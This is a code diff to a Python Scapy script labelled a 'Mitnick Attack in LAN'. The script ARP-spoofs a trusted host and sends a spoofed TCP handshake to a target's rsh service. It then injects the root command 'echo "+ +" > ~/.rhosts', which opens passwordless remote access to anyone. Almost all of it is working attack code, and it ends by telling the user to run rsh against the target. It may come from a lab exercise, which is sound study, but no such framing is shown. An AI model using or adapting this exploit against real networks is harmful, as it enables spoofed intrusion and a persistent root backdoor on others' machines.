@@ -1,5 +1,6 @@
 """Mitnick Attack in LAN."""
 import argparse
+import logging
 import multiprocessing
 import os
 import sys
@@ -8,8 +9,11 @@ import time
 import scapy.all as sc
 from scapy.layers import inet, l2
 
-RSH_PORT = 513
-SEND_PORT = 1023
+RSH_PORT = 514
+FIRST_SRC_PORT = 1023
+SECOND_SRC_PORT = 2046
+
+logger = logging.getLogger(__name__)
 
 
 def get_mac_from_ip(interface: str, ip: str) -> str:
@@ -65,168 +69,97 @@ def arpspoof(mac_addr: str, target_ip: str, target_mac: str,
     # Own MAC address
     a.hwsrc = mac_addr
 
-    a.show()
-
     # Waits for its parent send SIGTERM
     while True:
-        sc.send(a)
+        sc.send(a, verbose=0)
         time.sleep(1)
 
 
-def send_ack(ip_packet, p, seq) -> None:
-    """Send ACK to 'p' packet."""
-    ack_n = p[inet.TCP].seq + len(p[sc.Raw])
-
-    ack_packet = inet.TCP(sport=SEND_PORT,
-                          dport=RSH_PORT,
-                          flags='A',
-                          ack=ack_n,
-                          seq=seq)
-    sc.send(ip_packet / ack_packet)
-
-    return ack_n
-
-
-def send_fin_ack(ip_packet, p, seq) -> None:
-    """Send FIN ACK to 'p' packet."""
-    ack_n = p[inet.TCP].seq + len(p[sc.Raw])
-
-    ack_packet = inet.TCP(sport=SEND_PORT,
-                          dport=RSH_PORT,
-                          flags='FA',
-                          ack=ack_n,
-                          seq=seq)
-    sc.send(ip_packet / ack_packet)
-
-    return ack_n
-
-
-def rsh_attack(target_ip: str, trusted_ip: str) -> None:
+def rsh_attack(target_ip: str, trusted_ip: str, ifname: str) -> None:
     """Run the Remote Shell attack."""
     # Base IP packet with spoofed source IP
     ip_packet = inet.IP(src=trusted_ip, dst=target_ip)
 
     # --- THREE-WAY HANDSHAKE
     seq = 1000
-    print('Initiating TCP three-way handshake')
-    syn_packet = inet.TCP(sport=SEND_PORT, dport=RSH_PORT, flags='S', seq=seq)
-    synack = sc.sr1(ip_packet / syn_packet)
+    logger.info('Initiating TCP three-way handshake...')
+    syn_packet = inet.TCP(sport=FIRST_SRC_PORT,
+                          dport=RSH_PORT,
+                          flags='S',
+                          seq=seq)
+    synack = sc.sr1(ip_packet / syn_packet, verbose=0)
 
     seq += 1
 
-    ack_packet = inet.TCP(sport=SEND_PORT,
+    ack_packet = inet.TCP(sport=FIRST_SRC_PORT,
                           dport=RSH_PORT,
                           flags='A',
                           ack=synack.seq + 1,
                           seq=seq)
-    sc.send(ip_packet / ack_packet)
-    print('Done')
+    sc.send(ip_packet / ack_packet, verbose=0)
+    logger.info('Done')
 
-    # --- REMOTE SHELL INIT
-    print('Sending user info')
-    data = "\000root\000root\000xterm/38400\000".encode()
-    tcp_packet = inet.TCP(sport=SEND_PORT,
+    # --- RSH - Send backdoor
+    logger.info('Sending backdoor...')
+    backdoor = 'echo "+ +" > ~/.rhosts'
+    data = f'{SECOND_SRC_PORT}\x00root\x00root\x00{backdoor}\x00'
+    tcp_packet = inet.TCP(sport=FIRST_SRC_PORT,
                           dport=RSH_PORT,
                           flags='PA',
                           ack=synack.seq + 1,
                           seq=seq)
-    res = sc.sr1(ip_packet / tcp_packet / data)
-    print('Done')
+    res = sc.sr1(ip_packet / tcp_packet / data, verbose=0)
+    logger.info('Done')
 
-    seq += len(data)
+    # --- RSH - Second connection's three-way handshake
+    logger.info('Accepting second three-way handshake')
+    res = sc.sniff(iface=ifname, filter=f'tcp and host {target_ip}',
+                   count=1)[0]
 
-    s = sc.L3RawSocket()
-
-    while True:
-        p = s.recv(sc.MTU)
-        if p.haslayer(inet.TCP) and p.haslayer(
-                sc.Raw) and p[inet.TCP].dport == SEND_PORT:
-            if 'root@'.encode() in p.load:
-                ack_n = send_ack(ip_packet, p, seq)
-                break
-
-    # --- REMOTE SHELL READY
-    print('RSH init stablished, ready to send commands!')
-
-    backdoor = 'echo "+ +" > ~/.rhosts\r'
-    print(f'Sending backdoor: {backdoor}')
-
-    # Send backdoor
-    for char in backdoor:
-        print(f'\tSending "{char}":')
-
-        char_packet = inet.TCP(sport=SEND_PORT,
-                               dport=RSH_PORT,
-                               flags='PA',
-                               ack=ack_n,
-                               seq=seq)
-        seq += 1
-
-        res = sc.sr1(ip_packet / char_packet / char.encode())
-        print('\t\tPacket sent and response received')
-
-        send_ack(ip_packet, res, seq)
-        print('\t\tACK sent')
-
-    # Wait shell text and send ACK
-    while True:
-        p = s.recv(sc.MTU)
-        if p.haslayer(inet.TCP) and p.haslayer(
-                sc.Raw) and p[inet.TCP].dport == SEND_PORT:
-            ack_n = send_ack(ip_packet, p, seq)
-            break
-
-    # Send logout request
-    logout_code = '\004'
-    logout_packet = inet.TCP(sport=SEND_PORT,
-                             dport=RSH_PORT,
-                             flags='PA',
-                             ack=ack_n,
-                             seq=seq)
-    seq += 1
-
-    res = sc.sr1(ip_packet / logout_packet / logout_code.encode())
-    send_ack(ip_packet, res, seq)
-
-    ack_n = res[inet.TCP].seq + len(res[sc.Raw])
-
-    ack_packet = inet.TCP(sport=SEND_PORT,
-                          dport=RSH_PORT,
-                          flags='A',
-                          ack=ack_n,
-                          seq=seq)
-    res = sc.sr1(ip_packet / ack_packet)
-
-    send_fin_ack(ip_packet, res, seq)
+    synack = inet.TCP(sport=SECOND_SRC_PORT,
+                      dport=1023,
+                      flags='SA',
+                      ack=res.seq + 1,
+                      seq=1000)
+    res = sc.sr1(ip_packet / synack, verbose=0)
+    logger.info('Done')
 
     return
 
 
 def main(target_ip: str, trusted_ip: str) -> None:
     """Run the Mitnick Attack."""
-    print(f'Target IP: {target_ip}')
-    print(f'Trusted IP: {trusted_ip}')
+    format = '[%(levelname)s] %(message)s'
+    logging.basicConfig(level=logging.INFO, format=format)
+
+    logger.info(f'Target IP: {target_ip}')
+    logger.info(f'Trusted IP: {trusted_ip}')
 
     res = get_ifname_and_mac_by_iprange(target_ip)
 
     if len(res) == 0:
-        print('Error: could not get ifname & MAC address using the target IP')
+        logger.info(
+            'Error: could not get ifname & MAC address using the target IP')
         sys.exit(1)
 
     ifname, mac_addr = res
 
-    print(f'Interface identified: {ifname}')
-    print(f'MAC Address: {mac_addr}')
+    logger.info(f'Interface identified: {ifname}')
+    logger.info(f'MAC Address: {mac_addr}')
 
     target_mac = get_mac_from_ip(ifname, target_ip)
 
     if target_mac == '':
-        print('Error: could not get target MAC address')
+        logger.info('Error: could not get target MAC address')
         sys.exit(1)
 
-    print(f'Target MAC Address: {target_mac}')
+    logger.info(f'Target MAC Address: {target_mac}')
 
-    print('\nCalling ARP Spoof in another process...')
+    logger.info(f'Disabling IP forwarding on interface {ifname}')
+    os.system(
+        f'sysctl -w net.ipv4.conf.{ifname}.forwarding=0 > /dev/null 2>&1')
+
+    logger.info('Calling ARP Spoof in another process...')
     arpspoof_proc = multiprocessing.Process(name='ArpSpoofThread',
                                             target=arpspoof,
                                             kwargs={
@@ -236,13 +169,21 @@ def main(target_ip: str, trusted_ip: str) -> None:
                                                 'trusted_ip': trusted_ip
                                             })
     arpspoof_proc.start()
-    print('Done')
 
-    print('\nInitiating attack...')
-    rsh_attack(target_ip, trusted_ip)
-    print('Done')
+    logger.info('Initiating attack...')
+    rsh_attack(target_ip, trusted_ip, ifname)
+    logger.info('Finished attack')
+
+    logger.info(f'Enabling IP forwarding on interface {ifname}')
+    os.system(
+        f'sysctl -w net.ipv4.conf.{ifname}.forwarding=1 > /dev/null 2>&1')
 
     arpspoof_proc.terminate()
+    logger.info('Killed ARP Spoof process')
+
+    logger.info(f'Done! Now you can run "rsh {target_ip}" :)')
+
+    return
 
 
 if __name__ == '__main__':
